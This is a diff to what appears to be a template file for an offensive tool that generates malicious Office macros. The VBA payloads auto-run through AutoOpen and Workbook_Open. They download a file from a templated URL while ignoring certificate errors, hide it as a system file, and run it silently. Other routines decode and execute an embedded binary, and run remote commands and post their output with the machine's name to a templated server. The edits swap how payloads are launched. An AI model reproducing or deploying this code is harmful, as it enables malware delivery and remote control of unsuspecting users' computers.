@@ -3,26 +3,18 @@
 
 HELLO = \
 """
-Private Sub toto()
+Private Sub Hello()
     MsgBox "Hello from <<<TEMPLATE>>>" & vbCrLf & "Remember to always be careful when you enable MS Office macros." & vbCrLf & "Have a nice day!"
-End Sub
-
-Private Sub testMacroXl()
-    Application.Run "ThisWorkbook.toto"
-End Sub
-
-Private Sub testMacroWd()
-    toto
 End Sub
 
 ' triggered when Word/PowerPoint generator is used 
 Sub AutoOpen()
-    testMacroWd
+    Hello
 End Sub
 
 ' triggered when Excel generator is used
 Sub Workbook_Open()
-    testMacroXl
+    Hello
 End Sub
 """
 
@@ -40,7 +32,7 @@ Private Sub DownloadAndExecute()
     myURL = "<<<TEMPLATE>>>"
     downloadPath = "<<<TEMPLATE>>>"
     
-    Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP")
+    Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     WinHttpReq.setOption(2) = 13056 ' Ignore cert errors
     WinHttpReq.Open "GET", myURL, False ', "username", "password"
     WinHttpReq.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
@@ -53,7 +45,8 @@ Private Sub DownloadAndExecute()
         oStream.Write WinHttpReq.ResponseBody
         oStream.SaveToFile downloadPath, 2  ' 1 = no overwrite, 2 = overwrite (will not work with file attrs)
         oStream.Close
-        result = Shell(downloadPath, 0) ' vbHide = 0
+        CreateObject("WScript.Shell").Run downloadPath, 0
+        'result = Shell(downloadPath, 0) ' vbHide = 0
     End If    
     
 End Sub
@@ -83,7 +76,7 @@ Private Sub DownloadAndExecute()
     downloadPath = "<<<TEMPLATE>>>"
     
     If Dir(downloadPath, vbHidden + vbSystem) = "" Then
-        Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP")
+        Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP.6.0")
         WinHttpReq.setOption(2) = 13056 ' Ignore cert errors
         WinHttpReq.Open "GET", myURL, False ', "username", "password"
         WinHttpReq.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
@@ -98,7 +91,7 @@ Private Sub DownloadAndExecute()
             oStream.SaveToFile downloadPath, 2  ' 1 = no overwrite, 2 = overwrite (will not work with file attrs)
             oStream.Close
             SetAttr downloadPath, vbReadOnly + vbHidden + vbSystem
-            result = Shell(downloadPath, 0) ' vbHide = 0
+            CreateObject("WScript.Shell").Run downloadPath, 0
         End If
        
     End If
@@ -516,7 +509,8 @@ Private Sub DecodeExec()
     Call writeBytes(outFile, decode)
     
     Dim retVal
-    retVal = Shell(outFile, 0)
+    'retVal = Shell(outFile, 0)
+    retVal = CreateObject("WScript.Shell").Run outFile, 0
 End Sub
 
 
@@ -549,8 +543,8 @@ End Sub
 Private Sub Main()
     Dim msg As String
     serverUrl = "<<<TEMPLATE>>>"
-       msg = "<<<TEMPLATE>>>"
-       On Error GoTo byebye
+    msg = "<<<TEMPLATE>>>"
+    On Error GoTo byebye
     msg = PlayCmd(msg)
     SendResponse msg
     On Error GoTo 0
@@ -577,7 +571,7 @@ End Function
 Private Function GetId() As String
     Dim myInfo As String
     Dim myID As String
-    myID = Environ("COMPUTERNAME") & " " & Environ("OS") & " " & Environ("PROCESSOR_IDENTIFIER")
+    myID = Environ("COMPUTERNAME") & " " & Environ("OS")
     GetId = myID
 End Function
 
@@ -585,7 +579,7 @@ End Function
 Private Function SendResponse(cmdOutput)
     Dim data As String
     Dim response As String
-    data = "id=" & GetId & vbCrLf & "&cmdOutput=" & vbCrLf & cmdOutput
+    data = "id=" & GetId  & "&cmdOutput=" & cmdOutput
     SendResponse = HttpPostData(serverUrl, data)
 End Function
 
